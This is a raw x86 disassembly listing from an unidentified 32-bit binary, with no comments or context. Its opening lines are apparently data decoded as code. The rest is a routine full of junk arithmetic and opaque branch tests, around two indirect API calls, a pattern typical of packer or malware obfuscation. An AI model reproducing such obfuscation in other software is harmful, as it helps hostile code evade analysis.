  41a21f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a220:	inc    ebx
  41a221:	and    eax,0x2cc9182
  41a226:	mov    dh,BYTE PTR [ebx-0x4f]
  41a229:	mov    al,0xc8
  41a22b:	push   ecx
  41a22c:	test   DWORD PTR [esi+0x6e20672f],0x1ae3a7d1
  41a236:	es sub eax,0xdd2da7c9
  41a23c:	mov    cl,0x5c
  41a23e:	out    0x77,al
  41a240:	adc    bh,BYTE PTR [edi-0x78]
  41a243:	xorps  xmm1,xmm2
  41a246:	push   ecx
  41a247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a248:	push   ebx
  41a249:	pop    ecx
  41a24a:	xor    edx,DWORD PTR [eax+edx*2-0x2bcaf56c]
  41a251:	push   ss
  41a252:	and    cl,BYTE PTR [esi-0x4e]
  41a255:	add    BYTE PTR [eax],al
  41a257:	add    BYTE PTR [eax],al
  41a259:	adc    BYTE PTR [eax+0x0],al
  41a25c:	rcr    BYTE PTR [edx],cl
  41a25e:	add    BYTE PTR [eax],al
  41a260:	shr    BYTE PTR [edx],cl
  41a262:	inc    eax
  41a263:	add    bh,ch
  41a265:	mov    al,ds:0xcbc10000
  41a26a:	inc    eax
  41a26b:	add    BYTE PTR [esi],cl
  41a26d:	inc    ebx
  41a26e:	add    BYTE PTR [eax],al
  41a270:	iret   
  41a271:	push   cs
  41a272:	inc    ecx
  41a273:	add    cl,ah
  41a275:	pop    ebp
  41a276:	add    BYTE PTR [eax],al
  41a278:	mov    al,0x6c
  41a27a:	inc    ecx
  41a27b:	add    BYTE PTR [ebp+0x35],ah
  41a281:	rol    BYTE PTR [eax+eax*1+0x2b],1
  41a285:	leave  
  41a286:	add    BYTE PTR [eax],al
  41a288:	mov    ch,dl
  41a28a:	inc    ecx
  41a28b:	add    BYTE PTR [ebx+0x2e1],ah
  41a291:	add    BYTE PTR [eax],al
  41a293:	add    BYTE PTR [eax],al
  41a295:	add    BYTE PTR [eax],al
  41a297:	add    BYTE PTR [ebp-0x75],dl
  41a29a:	in     al,dx
  41a29b:	sub    esp,0x58
  41a29e:	mov    ecx,0x2c
  41a2a3:	add    ecx,ecx
  41a2a5:	mov    DWORD PTR [ebp-0x30],ecx
  41a2a8:	push   ebx
  41a2a9:	add    DWORD PTR [ebp-0x30],ecx
  41a2ac:	push   esi
  41a2ad:	add    ecx,ecx
  41a2af:	mov    eax,0x47
  41a2b4:	mov    ecx,0x65
  41a2b9:	add    eax,eax
  41a2bb:	add    DWORD PTR [ebp-0x30],eax
  41a2be:	and    ecx,eax
  41a2c0:	add    ecx,eax
  41a2c2:	add    DWORD PTR [ebp-0x30],ecx
  41a2c5:	push   edi
  41a2c6:	sub    DWORD PTR [ebp-0x30],eax
  41a2c9:	mov    ebx,DWORD PTR [ebp-0x30]
  41a2cc:	mov    eax,DWORD PTR [ebp-0x30]
  41a2cf:	cmp    eax,ecx
  41a2d1:	je     0x41a2e5
  41a2d3:	sub    eax,ebx
  41a2d5:	mov    ecx,0xb183
  41a2da:	mov    ebx,DWORD PTR [ebp-0x30]
  41a2dd:	sub    eax,ecx
  41a2df:	add    DWORD PTR [ebp-0x30],ebx
  41a2e2:	add    DWORD PTR [ebp-0x30],eax
  41a2e5:	call   DWORD PTR ds:0x45a460
  41a2eb:	cmp    eax,0xffffffc4
  41a2ee:	jne    0x41a346
  41a2f0:	cmp    ebx,eax
  41a2f2:	jne    0x41a346
  41a2f4:	mov    esi,DWORD PTR [ebp-0x30]
  41a2f7:	or     esi,eax
  41a2f9:	mov    edx,0x1e01411
  41a2fe:	or     DWORD PTR [ebp-0x30],ebx
  41a301:	cmp    esi,0xffffff96
  41a304:	jne    0x41a346
  41a306:	mov    edx,DWORD PTR [ebp-0x30]
  41a309:	add    DWORD PTR [ebp-0x30],eax
  41a30c:	cmp    edx,DWORD PTR ds:0x4599a4
  41a312:	jne    0x41a346
  41a314:	mov    edi,DWORD PTR [ebp-0x30]
  41a317:	mov    ecx,DWORD PTR ds:0x4599a4
  41a31d:	sub    DWORD PTR [ebp-0x30],ecx
  41a320:	cmp    edx,DWORD PTR [ebp-0x38]
  41a323:	je     0x41a346
  41a325:	mov    ebx,DWORD PTR [ebp-0x30]
  41a328:	mov    ecx,DWORD PTR ds:0x459950
  41a32e:	cmp    ebx,DWORD PTR [ebp-0x40]
  41a331:	je     0x41a346
  41a333:	sub    DWORD PTR [ebp-0x30],edi
  41a336:	and    ecx,esi
  41a338:	add    DWORD PTR [ebp-0x30],ebx
  41a33b:	add    DWORD PTR [ebp-0x30],edx
  41a33e:	cmp    ecx,DWORD PTR [ebp-0x30]
  41a341:	je     0x41a346
  41a343:	sub    DWORD PTR [ebp-0x30],ecx
  41a346:	test   eax,0x2b
  41a34b:	je     0x41a754
  41a351:	mov    eax,DWORD PTR [ebp-0x30]
  41a354:	cmp    eax,DWORD PTR ds:0x459950
  41a35a:	je     0x41a4d8
  41a360:	add    eax,ecx
  41a362:	mov    edi,DWORD PTR ds:0x459950
  41a368:	add    DWORD PTR [ebp-0x30],edi
  41a36b:	add    eax,eax
  41a36d:	mov    esi,DWORD PTR [ebp-0x30]
  41a370:	cmp    esi,0x7707
  41a376:	jne    0x41a4d8
  41a37c:	add    eax,esi
  41a37e:	mov    edi,esi
  41a380:	mov    edx,DWORD PTR ds:0x459950
  41a386:	cmp    edi,0x1bcd
  41a38c:	jne    0x41a4d8
  41a392:	cmp    ecx,esi
  41a394:	jne    0x41a4d8
  41a39a:	test   eax,0x87
  41a39f:	je     0x41a4d8
  41a3a5:	cmp    edi,0x75800300
  41a3ab:	jne    0x41a4d8
  41a3b1:	mov    ebx,DWORD PTR ds:0x459950
  41a3b7:	mov    esi,DWORD PTR [ebp-0x30]
  41a3ba:	sub    DWORD PTR [ebp-0x30],edx
  41a3bd:	cmp    esi,0xf
  41a3c0:	jne    0x41a4d8
  41a3c6:	sub    DWORD PTR [ebp-0x30],edi
  41a3c9:	mov    ecx,0x3bd8
  41a3ce:	mov    edi,DWORD PTR [ebp-0x30]
  41a3d1:	add    eax,esi
  41a3d3:	add    eax,ecx
  41a3d5:	add    eax,edx
  41a3d7:	add    DWORD PTR [ebp-0x30],edi
  41a3da:	cmp    eax,0xffffffaf
  41a3dd:	jne    0x41a4d8
  41a3e3:	sub    eax,edx
  41a3e5:	mov    edi,0x75
  41a3ea:	sub    edi,edx
  41a3ec:	mov    ebx,0x48
  41a3f1:	add    eax,eax
  41a3f3:	or     eax,esi
  41a3f5:	test   eax,0x92
  41a3fa:	je     0x41a4d8
  41a400:	sub    eax,edx
  41a402:	sub    eax,esi
  41a404:	add    ebx,edx
  41a406:	add    DWORD PTR [ebp-0x30],ebx
  41a409:	mov    ebx,DWORD PTR ds:0x4599a4
  41a40f:	mov    esi,DWORD PTR [ebp-0x30]
  41a412:	add    ebx,esi
  41a414:	test   eax,0xe0
  41a419:	je     0x41a4d8
  41a41f:	sub    edi,ecx
  41a421:	add    DWORD PTR [ebp-0x30],eax
  41a424:	mov    edx,DWORD PTR [ebp-0x30]
  41a427:	mov    esi,DWORD PTR [ebp-0x30]
  41a42a:	add    edx,ecx
  41a42c:	add    DWORD PTR [ebp-0x30],ebx
  41a42f:	and    edx,ebx
  41a431:	xor    DWORD PTR [ebp-0x30],esi
  41a434:	add    edx,ebx
  41a436:	cmp    edx,0x49
  41a439:	jne    0x41a4d8
  41a43f:	add    edx,edx
  41a441:	mov    esi,DWORD PTR ds:0x459950
  41a447:	cmp    eax,DWORD PTR ds:0x4599a4
  41a44d:	jne    0x41a4d8
  41a453:	mov    ecx,DWORD PTR [ebp-0x30]
  41a456:	mov    eax,DWORD PTR ds:0x4599a4
  41a45c:	add    eax,ebx
  41a45e:	add    esi,esi
  41a460:	sub    ecx,edi
  41a462:	sub    edx,esi
  41a464:	test   eax,0x0
  41a469:	je     0x41a4d8
  41a46b:	mov    esi,edi
  41a46d:	cmp    ecx,ebx
  41a46f:	jne    0x41a4d8
  41a471:	test   eax,0xcd
  41a476:	jne    0x41a4d8
  41a478:	test   eax,0x10b2
  41a47d:	jne    0x41a4d8
  41a47f:	mov    edi,DWORD PTR ds:0x459950
  41a485:	add    ecx,edx
  41a487:	mov    ebx,edi
  41a489:	sub    DWORD PTR [ebp-0x30],esi
  41a48c:	and    ebx,edi
  41a48e:	and    ebx,edi
  41a490:	cmp    ecx,edi
  41a492:	jne    0x41a4d8
  41a494:	mov    esi,0x15
  41a499:	mov    edi,0x79
  41a49e:	add    DWORD PTR [ebp-0x30],ebx
  41a4a1:	sub    DWORD PTR [ebp-0x30],ecx
  41a4a4:	cmp    edx,DWORD PTR [ebp-0x1c]
  41a4a7:	je     0x41a4d8
  41a4a9:	mov    ecx,DWORD PTR [ebp-0x30]
  41a4ac:	cmp    eax,DWORD PTR [ebp-0x48]
  41a4af:	jne    0x41a4d8
  41a4b1:	and    ecx,ebx
  41a4b3:	mov    esi,DWORD PTR ds:0x459934
  41a4b9:	mov    ebx,DWORD PTR [ebp-0x30]
  41a4bc:	add    DWORD PTR [ebp-0x30],esi
  41a4bf:	sub    ecx,edx
  41a4c1:	add    ebx,eax
  41a4c3:	add    DWORD PTR [ebp-0x30],edi
  41a4c6:	mov    DWORD PTR [ebp-0x30],ecx
  41a4c9:	sub    ebx,edx
  41a4cb:	mov    DWORD PTR [ebp-0x34],edi
  41a4ce:	sub    ebx,edi
  41a4d0:	sub    ebx,edx
  41a4d2:	sub    DWORD PTR [ebp-0x34],edi
  41a4d5:	add    DWORD PTR [ebp-0x30],ebx
  41a4d8:	mov    ecx,0x11
  41a4dd:	mov    edi,0xa58a
  41a4e2:	mov    edx,0xc5dc
  41a4e7:	and    edi,eax
  41a4e9:	add    edx,edx
  41a4eb:	sub    edi,esi
  41a4ed:	and    edx,ecx
  41a4ef:	add    edi,ebx
  41a4f1:	add    DWORD PTR [ebp-0x30],edx
  41a4f4:	and    edi,eax
  41a4f6:	or     edi,ecx
  41a4f8:	and    edi,ecx
  41a4fa:	cmp    edi,DWORD PTR [ebp-0x30]
  41a4fd:	je     0x41a50a
  41a4ff:	cmp    edi,0xd9ce
  41a505:	je     0x41a50a
  41a507:	sub    DWORD PTR [ebp-0x30],edi
  41a50a:	or     eax,edi
  41a50c:	sub    DWORD PTR [ebp-0x30],eax
  41a50f:	mov    ebx,0x87
  41a514:	mov    edi,DWORD PTR [ebp-0x30]
  41a517:	mov    esi,ecx
  41a519:	cmp    edi,DWORD PTR ds:0x459934
  41a51f:	jne    0x41a524
  41a521:	add    DWORD PTR [ebp-0x30],edi
  41a524:	sub    esi,edi
  41a526:	add    DWORD PTR [ebp-0x30],esi
  41a529:	mov    DWORD PTR [ebp-0x30],ebx
  41a52c:	add    ecx,ecx
  41a52e:	mov    edi,0x60
  41a533:	mov    esi,DWORD PTR [ebp-0x30]
  41a536:	add    DWORD PTR [ebp-0x30],edi
  41a539:	cmp    esi,0x1400220
  41a53f:	jne    0x41a58e
  41a541:	sub    DWORD PTR [ebp-0x30],ebx
  41a544:	and    DWORD PTR [ebp-0x30],edx
  41a547:	mov    edi,0x3b33
  41a54c:	cmp    esi,ebx
  41a54e:	je     0x41a58e
  41a550:	cmp    esi,0x30
  41a553:	je     0x41a58e
  41a555:	add    DWORD PTR [ebp-0x30],edi
  41a558:	mov    DWORD PTR [ebp-0x30],ecx
  41a55b:	cmp    esi,DWORD PTR [ebp-0x1c]
  41a55e:	jne    0x41a58e
  41a560:	sub    DWORD PTR [ebp-0x30],eax
  41a563:	sub    esi,edx
  41a565:	and    esi,eax
  41a567:	mov    eax,0xac
  41a56c:	cmp    esi,0xffffff9a
  41a56f:	jne    0x41a58e
  41a571:	or     DWORD PTR [ebp-0x30],edx
  41a574:	add    esi,edx
  41a576:	mov    edi,DWORD PTR ds:0x4599a4
  41a57c:	mov    edx,DWORD PTR [ebp-0x30]
  41a57f:	and    eax,edx
  41a581:	sub    edi,edx
  41a583:	add    DWORD PTR [ebp-0x30],eax
  41a586:	add    DWORD PTR [ebp-0x30],edi
  41a589:	sub    esi,edi
  41a58b:	sub    DWORD PTR [ebp-0x30],esi
  41a58e:	add    DWORD PTR [ebp-0x30],eax
  41a591:	sub    ecx,ebx
  41a593:	mov    edi,DWORD PTR [ebp-0x30]
  41a596:	and    edi,esi
  41a598:	mov    esi,DWORD PTR [ebp-0x30]
  41a59b:	sub    edi,edx
  41a59d:	cmp    edi,DWORD PTR [ebp-0x1c]
  41a5a0:	jne    0x41a5ee
  41a5a2:	mov    edx,DWORD PTR [ebp-0x30]
  41a5a5:	mov    eax,0x9
  41a5aa:	cmp    edx,DWORD PTR [ebp-0x30]
  41a5ad:	je     0x41a5ee
  41a5af:	xor    DWORD PTR [ebp-0x30],edi
  41a5b2:	mov    edi,DWORD PTR [ebp-0x30]
  41a5b5:	mov    DWORD PTR [ebp-0x28],edi
  41a5b8:	and    eax,esi
  41a5ba:	cmp    eax,DWORD PTR ds:0x4599a4
  41a5c0:	jne    0x41a5ee
  41a5c2:	add    edx,eax
  41a5c4:	cmp    edx,DWORD PTR ds:0x4599a4
  41a5ca:	je     0x41a5ee
  41a5cc:	add    edx,eax
  41a5ce:	sub    DWORD PTR [ebp-0x28],esi
  41a5d1:	sub    edx,edi
  41a5d3:	mov    eax,DWORD PTR [ebp-0x28]
  41a5d6:	or     eax,edi
  41a5d8:	sub    edx,esi
  41a5da:	mov    esi,DWORD PTR [ebp-0x28]
  41a5dd:	sub    esi,edx
  41a5df:	and    esi,edi
  41a5e1:	add    esi,edx
  41a5e3:	cmp    esi,0x11
  41a5e6:	jne    0x41a5ee
  41a5e8:	and    DWORD PTR [ebp-0x28],esi
  41a5eb:	add    DWORD PTR [ebp-0x28],eax
  41a5ee:	mov    eax,0xc9
  41a5f3:	mov    edx,DWORD PTR ds:0x459950
  41a5f9:	add    DWORD PTR [ebp-0x30],ecx
  41a5fc:	add    DWORD PTR [ebp-0x30],edx
  41a5ff:	add    DWORD PTR [ebp-0x30],eax
  41a602:	sub    ebx,ecx
  41a604:	mov    eax,DWORD PTR [ebp-0x30]
  41a607:	mov    edx,DWORD PTR [ebp-0x30]
  41a60a:	add    eax,ebx
  41a60c:	cmp    eax,0xf
  41a60f:	je     0x41a676
  41a611:	sub    DWORD PTR [ebp-0x30],eax
  41a614:	mov    esi,DWORD PTR [ebp-0x30]
  41a617:	add    DWORD PTR [ebp-0x30],esi
  41a61a:	mov    eax,0xeb
  41a61f:	and    eax,ebx
  41a621:	add    edx,ebx
  41a623:	or     edx,esi
  41a625:	cmp    edx,0x6703
  41a62b:	je     0x41a676
  41a62d:	mov    eax,DWORD PTR [ebp-0x30]
  41a630:	cmp    edx,0x49
  41a633:	je     0x41a676
  41a635:	add    DWORD PTR [ebp-0x30],eax
  41a638:	mov    eax,DWORD PTR [ebp-0x30]
  41a63b:	mov    edi,DWORD PTR ds:0x4599a4
  41a641:	cmp    edx,eax
  41a643:	jne    0x41a676
  41a645:	mov    esi,0x12
  41a64a:	add    edx,ebx
  41a64c:	cmp    eax,DWORD PTR ds:0x4599a4
  41a652:	je     0x41a65d
  41a654:	or     DWORD PTR [ebp-0x30],eax
  41a657:	add    DWORD PTR [ebp-0x30],edx
  41a65a:	and    DWORD PTR [ebp-0x30],edi
  41a65d:	mov    DWORD PTR [ebp-0x24],ebx
  41a660:	and    esi,ebx
  41a662:	sub    edi,ecx
  41a664:	sub    edi,edx
  41a666:	sub    DWORD PTR [ebp-0x30],esi
  41a669:	add    edi,ecx
  41a66b:	and    edi,eax
  41a66d:	and    edi,edx
  41a66f:	add    edi,esi
  41a671:	sub    edi,esi
  41a673:	sub    DWORD PTR [ebp-0x30],edi
  41a676:	add    DWORD PTR [ebp-0x30],esi
  41a679:	sub    ebx,ecx
  41a67b:	mov    DWORD PTR [ebp-0x30],ebx
  41a67e:	sub    edi,ebx
  41a680:	cmp    edi,0xffffff94
  41a683:	jne    0x41a74a
  41a689:	sub    edi,esi
  41a68b:	sub    edi,edx
  41a68d:	or     DWORD PTR [ebp-0x30],eax
  41a690:	mov    eax,DWORD PTR [ebp-0x30]
  41a693:	mov    esi,DWORD PTR [ebp-0x30]
  41a696:	add    DWORD PTR [ebp-0x30],eax
  41a699:	cmp    edi,0xffffffea
  41a69c:	je     0x41a74a
  41a6a2:	cmp    esi,0xffffffa4
  41a6a5:	je     0x41a74a
  41a6ab:	sub    esi,edx
  41a6ad:	add    DWORD PTR [ebp-0x30],esi
  41a6b0:	cmp    eax,0x2f
  41a6b3:	jne    0x41a74a
  41a6b9:	and    edi,ebx
  41a6bb:	mov    esi,DWORD PTR [ebp-0x30]
  41a6be:	add    esi,ecx
  41a6c0:	cmp    edi,ecx
  41a6c2:	je     0x41a74a
  41a6c8:	sub    DWORD PTR [ebp-0x30],esi
  41a6cb:	mov    eax,DWORD PTR [ebp-0x30]
  41a6ce:	sub    edi,ecx
  41a6d0:	or     DWORD PTR [ebp-0x30],eax
  41a6d3:	mov    esi,ebx
  41a6d5:	sub    DWORD PTR [ebp-0x30],esi
  41a6d8:	cmp    edi,DWORD PTR [ebp-0x24]
  41a6db:	je     0x41a74a
  41a6dd:	mov    eax,0x52
  41a6e2:	mov    ecx,DWORD PTR ds:0x459950
  41a6e8:	sub    edi,esi
  41a6ea:	sub    DWORD PTR [ebp-0x30],eax
  41a6ed:	cmp    edi,DWORD PTR ds:0x459934
  41a6f3:	je     0x41a74a
  41a6f5:	mov    eax,0xfd
  41a6fa:	add    ecx,edi
  41a6fc:	cmp    ecx,eax
  41a6fe:	jne    0x41a74a
  41a700:	and    ecx,edx
  41a702:	and    ecx,esi
  41a704:	add    DWORD PTR [ebp-0x30],eax
  41a707:	cmp    ecx,DWORD PTR ds:0x459950
  41a70d:	jne    0x41a74a
  41a70f:	test   ecx,0x70
  41a715:	je     0x41a74a
  41a717:	mov    eax,ebx
  41a719:	or     DWORD PTR [ebp-0x30],eax
  41a71c:	test   ecx,0x7d
  41a722:	je     0x41a74a
  41a724:	mov    edx,DWORD PTR ds:0x4599a4
  41a72a:	sub    edx,esi
  41a72c:	mov    esi,DWORD PTR [ebp-0x30]
  41a72f:	and    esi,edi
  41a731:	test   ecx,0xf2
  41a737:	jne    0x41a744
  41a739:	sub    DWORD PTR [ebp-0x30],ecx
  41a73c:	cmp    esi,0xffffffd0
  41a73f:	jne    0x41a744
  41a741:	add    DWORD PTR [ebp-0x30],esi
  41a744:	add    DWORD PTR [ebp-0x30],esi
  41a747:	xor    DWORD PTR [ebp-0x30],edx
  41a74a:	mov    DWORD PTR [ebp-0x40],ebx
  41a74d:	add    edi,edx
  41a74f:	sub    edi,esi
  41a751:	add    DWORD PTR [ebp-0x30],edi
  41a754:	mov    esi,0x1a
  41a759:	mov    eax,DWORD PTR [ebp-0x30]
  41a75c:	cmp    eax,DWORD PTR ds:0x459934
  41a762:	je     0x41a776
  41a764:	mov    edi,0x79101264
  41a769:	and    DWORD PTR [ebp-0x30],esi
  41a76c:	cmp    eax,esi
  41a76e:	jne    0x41a776
  41a770:	mov    DWORD PTR [ebp-0x14],edi
  41a773:	sub    DWORD PTR [ebp-0x30],eax
  41a776:	add    DWORD PTR [ebp-0x30],edi
  41a779:	push   0x0
  41a77b:	push   0x2200
  41a780:	push   0x0
  41a782:	call   DWORD PTR ds:0x45a478
  41a788:	mov    esi,0xc3cf
  41a78d:	cmp    eax,0xffffff98
  41a790:	je     0x41a7b2
  41a792:	mov    ebx,0x5b
  41a797:	mov    edi,DWORD PTR [ebp-0x30]
  41a79a:	mov    DWORD PTR [ebp-0x30],eax
  41a79d:	sub    ebx,esi
  41a79f:	sub    DWORD PTR [ebp-0x30],eax
  41a7a2:	add    DWORD PTR [ebp-0x30],edi
  41a7a5:	add    DWORD PTR [ebp-0x30],eax
  41a7a8:	and    esi,edi
  41a7aa:	sub    DWORD PTR [ebp-0x30],esi
  41a7ad:	or     ebx,esi
  41a7af:	mov    DWORD PTR [ebp-0x30],ebx
  41a7b2:	cmp    eax,DWORD PTR [ebp-0x40]
  41a7b5:	jne    0x41ac8e
  41a7bb:	cmp    esi,0xffffffa3
  41a7be:	je     0x41a7d0
  41a7c0:	mov    eax,DWORD PTR [ebp-0x30]
  41a7c3:	cmp    eax,DWORD PTR ds:0x459934
  41a7c9:	jne    0x41a7d0
  41a7cb:	add    eax,eax
  41a7cd:	sub    DWORD PTR [ebp-0x30],eax
  41a7d0:	mov    ebx,0x96
  41a7d5:	mov    edx,DWORD PTR [ebp-0x30]
  41a7d8:	mov    eax,DWORD PTR [ebp-0x30]
  41a7db:	add    edx,esi
  41a7dd:	add    edx,esi
  41a7df:	test   eax,0x65
  41a7e4:	jne    0x41a81b
  41a7e6:	mov    esi,DWORD PTR [ebp-0x30]
  41a7e9:	add    eax,eax
  41a7eb:	add    esi,edi
  41a7ed:	mov    ecx,DWORD PTR [ebp-0x30]
  41a7f0:	cmp    esi,0xffffffbe
  41a7f3:	je     0x41a81b
  41a7f5:	add    edx,ebx
  41a7f7:	sub    DWORD PTR [ebp-0x30],eax
  41a7fa:	mov    eax,DWORD PTR [ebp-0x30]
  41a7fd:	sub    edx,edi
  41a7ff:	or     DWORD PTR [ebp-0x30],eax
  41a802:	mov    eax,0x7a
  41a807:	mov    DWORD PTR [ebp-0x30],eax
  41a80a:	or     ecx,edx
  41a80c:	add    ecx,esi
  41a80e:	add    DWORD PTR [ebp-0x30],edi
  41a811:	sub    DWORD PTR [ebp-0x30],eax
  41a814:	sub    ecx,edx
  41a816:	add    ecx,edi
  41a818:	add    DWORD PTR [ebp-0x30],ecx
  41a81b:	sub    edi,ebx
  41a81d:	add    DWORD PTR [ebp-0x30],ecx
  41a820:	sub    edi,edx
  41a822:	add    edi,ecx
  41a824:	add    edi,edi
  41a826:	mov    eax,0x8d
  41a82b:	mov    edx,0xe3ac
  41a830:	sub    edi,edx
  41a832:	and    edi,ebx
  41a834:	add    DWORD PTR [ebp-0x30],edx
  41a837:	add    DWORD PTR [ebp-0x30],edi
  41a83a:	add    DWORD PTR [ebp-0x30],eax
  41a83d:	mov    edx,0x5d
  41a842:	add    eax,edi
  41a844:	mov    ecx,DWORD PTR [ebp-0x30]
  41a847:	cmp    eax,0xbaa6
  41a84c:	jne    0x41a96a
  41a852:	add    DWORD PTR [ebp-0x30],ecx
  41a855:	add    DWORD PTR [ebp-0x30],edx
  41a858:	cmp    eax,DWORD PTR [ebp-0x8]
  41a85b:	je     0x41a96a
  41a861:	cmp    eax,0x1d132d2
  41a866:	je     0x41a96a
  41a86c:	test   eax,0xbdcf
  41a871:	je     0x41a96a
  41a877:	mov    esi,DWORD PTR [ebp-0x30]
  41a87a:	test   esi,0x70de
  41a880:	je     0x41a96a
  41a886:	mov    edi,DWORD PTR [ebp-0x30]
  41a889:	cmp    edi,0xfffffff6
  41a88c:	jne    0x41a96a
  41a892:	cmp    edi,0x7e
  41a895:	je     0x41a96a
  41a89b:	sub    DWORD PTR [ebp-0x30],eax
  41a89e:	add    edi,edi
  41a8a0:	mov    ecx,DWORD PTR [ebp-0x30]
  41a8a3:	test   edi,0x1f
  41a8a9:	je     0x41a96a
  41a8af:	and    edi,esi
  41a8b1:	mov    esi,DWORD PTR [ebp-0x30]
  41a8b4:	mov    eax,DWORD PTR [ebp-0x30]
  41a8b7:	sub    ecx,edx
  41a8b9:	add    DWORD PTR [ebp-0x30],ecx
  41a8bc:	cmp    eax,edi
  41a8be:	jne    0x41a96a
  41a8c4:	add    eax,edx
  41a8c6:	add    eax,eax
  41a8c8:	add    DWORD PTR [ebp-0x30],esi
  41a8cb:	sub    eax,edi
  41a8cd:	add    eax,ebx
  41a8cf:	mov    ecx,DWORD PTR [ebp-0x30]
  41a8d2:	mov    esi,0x77
  41a8d7:	and    eax,edi
  41a8d9:	cmp    ecx,0xe17f
  41a8df:	jne    0x41a96a
  41a8e5:	add    DWORD PTR [ebp-0x30],esi
  41a8e8:	mov    edi,DWORD PTR ds:0x459950
  41a8ee:	mov    esi,0x8
  41a8f3:	add    eax,esi
  41a8f5:	add    DWORD PTR [ebp-0x30],ecx
  41a8f8:	cmp    eax,0x6a
  41a8fb:	jne    0x41a96a
  41a8fd:	sub    eax,edx
  41a8ff:	cmp    eax,DWORD PTR ds:0x4599a4
  41a905:	jne    0x41a96a
  41a907:	mov    edi,0x38
  41a90c:	mov    ecx,DWORD PTR [ebp-0x30]
  41a90f:	sub    eax,edx
  41a911:	cmp    ecx,0x9010513
  41a917:	je     0x41a96a
  41a919:	sub    DWORD PTR [ebp-0x30],eax
  41a91c:	mov    esi,0xb4
  41a921:	add    DWORD PTR [ebp-0x30],ecx
  41a924:	mov    eax,DWORD PTR [ebp-0x30]
  41a927:	add    edi,ecx
  41a929:	cmp    eax,DWORD PTR [ebp-0x28]
  41a92c:	je     0x41a96a
  41a92e:	mov    ecx,DWORD PTR [ebp-0x30]
  41a931:	cmp    edi,0xffffffdd
  41a934:	je     0x41a96a
  41a936:	or     edi,ebx
  41a938:	add    ecx,edx
  41a93a:	mov    DWORD PTR [ebp-0x58],esi
  41a93d:	mov    esi,edi
  41a93f:	add    eax,edi
  41a941:	sub    eax,edx
  41a943:	test   esi,0x60
  41a949:	jne    0x41a96a
  41a94b:	mov    edi,ebx
  41a94d:	and    ecx,esi
  41a94f:	sub    ecx,eax
  41a951:	sub    edi,esi
  41a953:	cmp    ecx,0x9d90
  41a959:	jne    0x41a96a
  41a95b:	add    DWORD PTR [ebp-0x58],edi
  41a95e:	add    ecx,ecx
  41a960:	mov    edi,0xd6
  41a965:	sub    edi,ecx
  41a967:	xor    DWORD PTR [ebp-0x30],edi
  41a96a:	cmp    esi,DWORD PTR [ebp-0x20]
  41a96d:	jne    0x41aa1d
  41a973:	mov    edi,DWORD PTR [ebp-0x30]
  41a976:	mov    eax,DWORD PTR [ebp-0x30]
  41a979:	cmp    eax,0xfffffffa
  41a97c:	jne    0x41aa1d
  41a982:	mov    esi,DWORD PTR [ebp-0x30]
  41a985:	cmp    eax,edx
  41a987:	je     0x41aa1d
  41a98d:	mov    ecx,DWORD PTR [ebp-0x30]
  41a990:	add    DWORD PTR [ebp-0x30],eax
  41a993:	or     edi,eax
  41a995:	add    edi,eax
  41a997:	test   esi,0xd8
  41a99d:	je     0x41aa1d
  41a99f:	mov    eax,DWORD PTR [ebp-0x30]
  41a9a2:	test   ecx,0x0
  41a9a8:	jne    0x41aa1d
  41a9aa:	and    ecx,eax
  41a9ac:	and    edi,esi
  41a9ae:	add    edi,edi
  41a9b0:	mov    eax,0x3cbb
  41a9b5:	mov    esi,DWORD PTR [ebp-0x30]
  41a9b8:	or     eax,edi
  41a9ba:	add    eax,ebx
  41a9bc:	cmp    eax,0x6d
  41a9bf:	jne    0x41aa1d
  41a9c1:	cmp    edi,0xffffff8c
  41a9c4:	jne    0x41aa1d
  41a9c6:	or     ecx,edx
  41a9c8:	sub    DWORD PTR [ebp-0x30],ecx
  41a9cb:	mov    edi,0x67
  41a9d0:	mov    ecx,DWORD PTR [ebp-0x30]
  41a9d3:	sub    ecx,edi
  41a9d5:	sub    ecx,ebx
  41a9d7:	cmp    eax,DWORD PTR ds:0x459934
  41a9dd:	jne    0x41aa1d
  41a9df:	mov    edi,0xfd50
  41a9e4:	add    DWORD PTR [ebp-0x30],edi
  41a9e7:	sub    esi,ebx
  41a9e9:	add    DWORD PTR [ebp-0x30],ecx
  41a9ec:	mov    edi,0xba
  41a9f1:	sub    eax,edx
  41a9f3:	or     esi,ebx
  41a9f5:	sub    esi,ebx
  41a9f7:	add    DWORD PTR [ebp-0x30],ecx
  41a9fa:	sub    DWORD PTR [ebp-0x30],esi
  41a9fd:	test   eax,0x146a
  41aa02:	je     0x41aa1d
  41aa04:	and    eax,ebx
  41aa06:	mov    esi,edx
  41aa08:	sub    DWORD PTR [ebp-0x30],esi
  41aa0b:	and    edi,edx
  41aa0d:	add    eax,ecx
  41aa0f:	sub    DWORD PTR [ebp-0x30],edi
  41aa12:	sub    eax,edx
  41aa14:	add    eax,esi
  41aa16:	cmp    eax,edx
  41aa18:	jne    0x41aa1d
  41aa1a:	add    DWORD PTR [ebp-0x30],eax
  41aa1d:	add    ebx,ebx
  41aa1f:	and    ecx,edi
  41aa21:	sub    DWORD PTR [ebp-0x30],ecx
  41aa24:	mov    eax,DWORD PTR ds:0x4599c8
  41aa2a:	add    DWORD PTR [ebp-0x30],ebx
  41aa2d:	mov    edi,DWORD PTR ds:0x459950
  41aa33:	sub    edi,ebx
  41aa35:	sub    DWORD PTR [ebp-0x30],ecx
  41aa38:	sub    DWORD PTR [ebp-0x30],eax
  41aa3b:	mov    DWORD PTR [ebp-0x30],eax
  41aa3e:	and    edi,ecx
  41aa40:	cmp    edi,0xffffffe3
  41aa43:	jne    0x41aa7d
  41aa45:	mov    eax,0x1
  41aa4a:	cmp    edi,0xffffffd5
  41aa4d:	je     0x41aa7d
  41aa4f:	mov    ecx,0xa5
  41aa54:	cmp    edi,0x191210a1
  41aa5a:	jne    0x41aa7d
  41aa5c:	mov    eax,DWORD PTR [ebp-0x30]
  41aa5f:	mov    DWORD PTR [ebp-0x30],edi
  41aa62:	add    eax,eax
  41aa64:	sub    ecx,edx
  41aa66:	mov    edi,DWORD PTR [ebp-0x30]
  41aa69:	or     ecx,edi
  41aa6b:	add    eax,edi
  41aa6d:	add    DWORD PTR [ebp-0x30],ecx
  41aa70:	sub    DWORD PTR [ebp-0x30],ebx
  41aa73:	sub    DWORD PTR [ebp-0x30],ecx
  41aa76:	cmp    eax,ecx
  41aa78:	jne    0x41aa7d
  41aa7a:	add    DWORD PTR [ebp-0x30],eax
  41aa7d:	add    edx,edx
  41aa7f:	mov    ecx,DWORD PTR [ebp-0x30]
